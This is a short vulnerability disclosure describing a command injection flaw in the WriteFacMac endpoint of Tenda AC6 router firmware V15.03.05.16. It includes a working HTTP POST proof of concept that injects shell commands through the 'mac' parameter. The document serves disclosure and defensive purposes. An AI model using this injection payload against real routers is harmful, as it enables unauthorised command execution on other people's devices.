# Information



**Vendor of the products:**   Shenzhen Tenda Technology Co.,Ltd.

**Vendor's website:**https://www.tenda.com.cn/

**Reported by:** Chen Bo ([2804894416@qq.com](mailto:2804894416@qq.com))

**Affected products:** AC6

**Affected firmware version:** V15.03.05.16

**Firmware download address:** [[AC6V1.0升级软件_腾达(Tenda)官方网站](https://tenda.com.cn/material/show/102661)](

# Overview

Tenda `AC6 V15.03.05.16` firmware has a verified command execution vulnerability. There is a command injection vulnerability in the WriteFacMac function. An attacker can achieve the purpose of arbitrary command execution by splicing commands.

# Vulnerability details

Call the corresponding function through the `WriteFacMac` route

![image-20250405012045704](WriteFacMac/image-20250405012045704.png)

There is a command injection vulnerability below

![image-20250405012139689](WriteFacMac/image-20250405012139689.png)



# POC

```
POST /goform/WriteFacMac HTTP/1.1
Host: 192.168.102.145
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36
Accept: text/plain, */*; q=0.01
X-Requested-With: XMLHttpRequest
Referer: http://192.168.102.145/main.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

mac=;ls;pwd;

```

![image-20250405012222880](WriteFacMac/image-20250405012222880.png)